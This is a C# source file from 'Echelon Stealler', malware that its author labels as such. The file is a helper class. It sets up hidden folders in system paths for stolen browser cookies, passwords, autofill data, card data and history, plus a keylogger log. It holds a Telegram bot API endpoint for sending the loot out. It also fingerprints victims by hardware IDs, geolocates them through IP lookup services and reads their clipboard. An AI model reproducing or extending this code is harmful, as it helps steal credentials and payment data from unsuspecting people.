///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Xml;

namespace Echelon
{
    public class Help
    {
        // Пути
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Help.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Help.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Help.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Help.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile
        

    // Выбираем рандомную системную папку
    public static string[] SysPatch = new string[]
    {
                LocalData, AppDate, Path.GetTempPath()
    };
        public static string RandomSysPatch = SysPatch[new Random().Next(0, SysPatch.Length)];

        // Мутекс берем из сгенерированного HWID
        public static string Mut = HWID;

        // Генерим уникальный HWID
        public static string HWID = GetProcessorID() + GetHwid();

        public static string GeoIpURL = "http://ip-api.com/xml";
        public static string ApiUrl = "https://api.telegram.org/bot"; //Help.ApiUrl 
        public static string IP = new WebClient().DownloadString("https://api.ipify.org/"); // Help.IP

        // Создаем рандомные папки для сбора лога стиллера
        public static string dir = RandomSysPatch + "\\" + GenString.Generate() + HWID + GenString.GeneNumbersTo();
        public static string Echelon_Dir = dir + "\\" + GenString.GeneNumbersTo() + HWID + GenString.Generate();
        public static string Browsers = Echelon_Dir + "\\Browsers";

        public static string Cookies = Browsers + "\\Cookies";
        public static string Passwords = Browsers + "\\Passwords";
        public static string Autofills = Browsers + "\\Autofills";
        public static string Downloads = Browsers + "\\Downloads";
        public static string History = Browsers + "\\History";
        public static string Cards = Browsers + "\\Cards";

        // Временные переменные
        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt"); //Help.date
        public static string DateLog = DateTime.Now.ToString("MM/dd/yyyy"); //Help.date

        // Создаем файл лога для Кейлоггера
        public static string LoggerLog = LocalData + "\\" + DateLog + "_" + HWID + ".txt"; // Help.LoggerLog

        // Получаем код страны типа: [RU]
        public static string CountryCOde() //Help.CountryCOde()

        {
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation CountryCOde
            string countryCode = "[" + xml.GetElementsByTagName("countryCode")[0].InnerText + "]";
            string CountryCOde = countryCode;
            return CountryCOde;
        }

        // Получаем название страны типа: [Russian]
        public static string Country() //Help.Country()

        {
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation Country
            string countryCode = "[" + xml.GetElementsByTagName("country")[0].InnerText + "]";
            string Country = countryCode;
            return Country;
        }

        // Получаем данные из буфера обмена
        public static string ClipBoard = Clipboard.GetText(); //Help.ClipBoard

        // Получаем VolumeSerialNumber
        public static string GetHwid() 
        {
            string hwid = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                hwid = diskLetter;
            }
            catch
            { }
            return hwid;
        }

        // Получаем Processor Id
        public static string GetProcessorID()
        {
            string sProcessorID = "";
            string sQuery = "SELECT ProcessorId FROM Win32_Processor";
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }

            return (sProcessorID);
        }

    }


}
